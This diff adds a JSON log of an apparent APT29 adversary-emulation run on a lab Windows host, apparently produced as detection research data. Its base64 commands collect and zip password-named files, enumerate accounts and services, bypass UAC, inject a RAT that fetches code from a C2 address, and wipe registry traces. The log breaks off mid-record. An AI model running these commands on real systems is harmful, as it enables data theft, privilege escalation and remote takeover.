@@ -1,0 +1,3727 @@
+[
+  {
+    "command": "cG93ZXJzaGVsbC5leGU7aWYgKCQ/KSB7ICB3cml0ZS1ob3N0ICJbKl0gUG93ZXJTaGVsbCBzdWNjZXNzZnVsbHkgc3Bhd25lZCI7ICBleGl0IDA7fQ==",
+    "delegated_timestamp": "2022-09-29T19:31:11Z",
+    "collected_timestamp": "2022-09-29T19:31:24Z",
+    "finished_timestamp": "2022-09-29T19:31:27Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4736,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a5daa530-c640-49bc-aa54-6808789a684a",
+      "ability_name": "PowerShell",
+      "ability_description": "Spawn powershell.exe from cmd.exe"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "execution",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "technique_id": "T1059.001"
+    },
+    "agent_reported_time": "2022-09-29T19:31:24Z"
+  },
+  {
+    "command": "JGVudjpBUFBEQVRBOyRmaWxlcz1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRVwgLUluY2x1ZGUgKi5kb2MsKi54cHMsKi54bHMsKi5wcHQsKi5wcHMsKi53cHMsKi53cGQsKi5vZHMsKi5vZHQsKi5sd3AsKi5qdGQsKi5wZGYsKi56aXAsKi5yYXIsKi5kb2N4LCoudXJsLCoueGxzeCwqLnBwdHgsKi5wcHN4LCoucHN0LCoub3N0LCpwc3cqLCpwYXNzKiwqbG9naW4qLCphZG1pbiosKnNpZnIqLCpzaWZlciosKnZwbiwqLmpwZywqLnR4dCwqLmxuayAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWU7IENvbXByZXNzLUFyY2hpdmUgLUxpdGVyYWxQYXRoICRmaWxlcyAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIC1EZXN0aW5hdGlvblBhdGggJGVudjpBUFBEQVRBXERyYWZ0LlppcCAtRm9yY2U=",
+    "delegated_timestamp": "2022-09-29T19:31:31Z",
+    "collected_timestamp": "2022-09-29T19:31:59Z",
+    "finished_timestamp": "2022-09-29T19:32:21Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 3180,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5692da31-3586-4e4f-8f07-5750070c730b",
+      "ability_name": "Automated Collection",
+      "ability_description": "Execute PowerShell from cmd.exe to collect and compress files of specific extensions."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Automated Collection",
+      "technique_id": "T1119"
+    },
+    "agent_reported_time": "2022-09-29T19:31:59Z"
+  },
+  {
+    "command": "aXBjb25maWcgL2FsbA==",
+    "delegated_timestamp": "2022-09-29T19:32:26Z",
+    "collected_timestamp": "2022-09-29T19:33:01Z",
+    "finished_timestamp": "2022-09-29T19:33:01Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4160,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+      "ability_name": "System Network Configuration Discovery (2)",
+      "ability_description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Network Configuration Discovery",
+      "technique_id": "T1016"
+    },
+    "agent_reported_time": "2022-09-29T19:33:01Z"
+  },
+  {
+    "command": "YXJwIC1h",
+    "delegated_timestamp": "2022-09-29T19:33:06Z",
+    "collected_timestamp": "2022-09-29T19:33:40Z",
+    "finished_timestamp": "2022-09-29T19:33:40Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 1644,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+      "ability_name": "System Network Configuration Discovery (2) (2)",
+      "ability_description": "The arp utility is executed via cmd to enumerate local ARP configuration information."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Network Configuration Discovery",
+      "technique_id": "T1016"
+    },
+    "agent_reported_time": "2022-09-29T19:33:40Z"
+  },
+  {
+    "command": "ZWNobyAlVVNFUkRPTUFJTiVcJVVTRVJOQU1FJQ==",
+    "delegated_timestamp": "2022-09-29T19:33:42Z",
+    "collected_timestamp": "2022-09-29T19:34:42Z",
+    "finished_timestamp": "2022-09-29T19:34:42Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 2760,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+      "ability_name": "System Owner / User Discovery",
+      "ability_description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033"
+    },
+    "agent_reported_time": "2022-09-29T19:34:42Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXHBzLnBzMSAtVmVyYm9zZSAtRm9yY2U7UHJvY2Vzc0xpc3Q=",
+    "delegated_timestamp": "2022-09-29T19:34:47Z",
+    "collected_timestamp": "2022-09-29T19:35:45Z",
+    "finished_timestamp": "2022-09-29T19:35:57Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 4572,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+      "ability_name": "Process Discovery",
+      "ability_description": "API call(s) are executed to enumerate local running processes."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    },
+    "agent_reported_time": "2022-09-29T19:35:45Z"
+  },
+  {
+    "command": "dGFza2xpc3QgL3Y=",
+    "delegated_timestamp": "2022-09-29T19:36:02Z",
+    "collected_timestamp": "2022-09-29T19:36:36Z",
+    "finished_timestamp": "2022-09-29T19:36:37Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4572,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "41610306-087c-4c34-874b-37b8ed633a36",
+      "ability_name": "Process Discovery (2)",
+      "ability_description": "The tasklist utility is executed via cmd to enumerate local running processes."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Process Discovery",
+      "technique_id": "T1057"
+    },
+    "agent_reported_time": "2022-09-29T19:36:36Z"
+  },
+  {
+    "command": "c2MgcXVlcnk=",
+    "delegated_timestamp": "2022-09-29T19:36:37Z",
+    "collected_timestamp": "2022-09-29T19:37:28Z",
+    "finished_timestamp": "2022-09-29T19:37:28Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 6672,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "2ff877b4-0c00-401e-9d3f-070c70b610df",
+      "ability_name": "System Service Discovery (2) (2)",
+      "ability_description": "The sc utility is executed via cmd to enumerate local active services."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Service Discovery",
+      "technique_id": "T1007"
+    },
+    "agent_reported_time": "2022-09-29T19:37:28Z"
+  },
+  {
+    "command": "bmV0IHN0YXJ0",
+    "delegated_timestamp": "2022-09-29T19:37:32Z",
+    "collected_timestamp": "2022-09-29T19:38:28Z",
+    "finished_timestamp": "2022-09-29T19:38:29Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4200,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "144b1384-5060-494f-80eb-91772695cdf3",
+      "ability_name": "System Service Discovery (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate local active services."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Service Discovery",
+      "technique_id": "T1007"
+    },
+    "agent_reported_time": "2022-09-29T19:38:28Z"
+  },
+  {
+    "command": "c3lzdGVtaW5mbw==",
+    "delegated_timestamp": "2022-09-29T19:38:33Z",
+    "collected_timestamp": "2022-09-29T19:39:13Z",
+    "finished_timestamp": "2022-09-29T19:39:15Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4664,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+      "ability_name": "System Information Discovery (2) (2) (2)",
+      "ability_description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T19:39:13Z"
+  },
+  {
+    "command": "bmV0IGNvbmZpZyB3b3Jrc3RhdGlvbg==",
+    "delegated_timestamp": "2022-09-29T19:39:18Z",
+    "collected_timestamp": "2022-09-29T19:39:56Z",
+    "finished_timestamp": "2022-09-29T19:39:56Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 6260,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+      "ability_name": "System Information Discovery (2) (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate local operating system configuration."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T19:39:55Z"
+  },
+  {
+    "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=",
+    "delegated_timestamp": "2022-09-29T19:39:58Z",
+    "collected_timestamp": "2022-09-29T19:40:37Z",
+    "finished_timestamp": "2022-09-29T19:40:37Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 4772,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+      "ability_name": "Permissions Groups Discovery (2) (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate members of the local system's administrators group."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Permission Groups Discovery",
+      "technique_id": "T1069"
+    },
+    "agent_reported_time": "2022-09-29T19:40:36Z"
+  },
+  {
+    "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgL2RvbWFpbg==",
+    "delegated_timestamp": "2022-09-29T19:40:38Z",
+    "collected_timestamp": "2022-09-29T19:41:25Z",
+    "finished_timestamp": "2022-09-29T19:41:25Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 5392,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+      "ability_name": "Permissions Groups Discovery",
+      "ability_description": "The net utility is executed via cmd to enumerate members of the domain controller’s administrators group."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Permission Groups Discovery",
+      "technique_id": "T1069"
+    },
+    "agent_reported_time": "2022-09-29T19:41:24Z"
+  },
+  {
+    "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4=",
+    "delegated_timestamp": "2022-09-29T19:41:28Z",
+    "collected_timestamp": "2022-09-29T19:42:20Z",
+    "finished_timestamp": "2022-09-29T19:42:21Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 5908,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+      "ability_name": "Permissions Groups Discovery (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate members of the domain administrators group."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Permission Groups Discovery",
+      "technique_id": "T1069"
+    },
+    "agent_reported_time": "2022-09-29T19:42:19Z"
+  },
+  {
+    "command": "bmV0IHVzZXIgL2RvbWFpbg==",
+    "delegated_timestamp": "2022-09-29T19:42:24Z",
+    "collected_timestamp": "2022-09-29T19:43:19Z",
+    "finished_timestamp": "2022-09-29T19:43:19Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 2600,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "61221fb9-cb32-46d5-98fd-90567a621526",
+      "ability_name": "Account Discovery",
+      "ability_description": "The net utility is executed via cmd to enumerate domain user accounts."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Account Discovery",
+      "technique_id": "T1087"
+    },
+    "agent_reported_time": "2022-09-29T19:43:18Z"
+  },
+  {
+    "command": "bmV0IHVzZXIgJVVTRVJOQU1FJSAvZG9tYWlu",
+    "delegated_timestamp": "2022-09-29T19:43:19Z",
+    "collected_timestamp": "2022-09-29T19:44:28Z",
+    "finished_timestamp": "2022-09-29T19:44:28Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 5744,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+      "ability_name": "Account Discovery (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate detailed information about a specific user account."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Account Discovery",
+      "technique_id": "T1087"
+    },
+    "agent_reported_time": "2022-09-29T19:44:28Z"
+  },
+  {
+    "command": "cmVnIHF1ZXJ5IEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt",
+    "delegated_timestamp": "2022-09-29T19:44:29Z",
+    "collected_timestamp": "2022-09-29T19:45:10Z",
+    "finished_timestamp": "2022-09-29T19:45:10Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 3688,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+      "ability_name": "Query Registry (2) (2) (2)",
+      "ability_description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Query Registry",
+      "technique_id": "T1012"
+    },
+    "agent_reported_time": "2022-09-29T19:45:10Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW52b2tlLUJ5cGFzc1VBQ1Rva2VuTWFuaXB1bGF0aW9uIC1Bcmd1bWVudHMgIi1ub3AgLWV4ZWMgYnlwYXNzIC1FbmNvZGVkQ29tbWFuZCAkcGNvZGUiIC1WZXJib3Nl",
+    "delegated_timestamp": "2022-09-29T19:45:14Z",
+    "collected_timestamp": "2022-09-29T19:46:00Z",
+    "finished_timestamp": "2022-09-29T19:46:02Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 5556,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+      "ability_name": "Bypass User Account Control",
+      "ability_description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
+      "technique_id": "T1134.001"
+    },
+    "agent_reported_time": "2022-09-29T19:46:00Z"
+  },
+  {
+    "command": "UmVtb3ZlLUl0ZW0gLVBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIqIC1SZWN1cnNlIC1Gb3JjZTtpZiAoISh0ZXN0LXBhdGggLXBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIpKSB7ICB3cml0ZS1ob3N0ICJbK10gUmVnIGtleXMgcmVtb3ZlZCEiOyB9",
+    "delegated_timestamp": "2022-09-29T19:46:05Z",
+    "collected_timestamp": "2022-09-29T19:46:51Z",
+    "finished_timestamp": "2022-09-29T19:46:52Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 3924,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5ff80022-8d85-410b-b868-6c7565b267e5",
+      "ability_name": "Registry Cleanup for UAC Bypass Technique",
+      "ability_description": "Delete registry entries post-UAC bypass."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Modify Registry",
+      "technique_id": "T1112"
+    },
+    "agent_reported_time": "2022-09-29T19:46:51Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1QU0luamVjdC5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW5qZWN0IC1Qb3NoQ29kZSAkcGNvZGU7",
+    "delegated_timestamp": "2022-09-29T19:46:55Z",
+    "collected_timestamp": "2022-09-29T19:47:41Z",
+    "finished_timestamp": "2022-09-29T19:47:49Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 3104,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "088b8639-3f37-42cc-9dc8-01aabb645461",
+      "ability_name": "Process Injection",
+      "ability_description": "The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "privilege-escalation",
+      "technique_name": "Process Injection",
+      "technique_id": "T1055"
+    },
+    "agent_reported_time": "2022-09-29T19:47:41Z"
+  },
+  {
+    "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBDb250cm9sbGVycyIgL2RvbWFpbg==",
+    "delegated_timestamp": "2022-09-29T19:47:50Z",
+    "collected_timestamp": "2022-09-29T19:48:33Z",
+    "finished_timestamp": "2022-09-29T19:48:34Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 6044,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
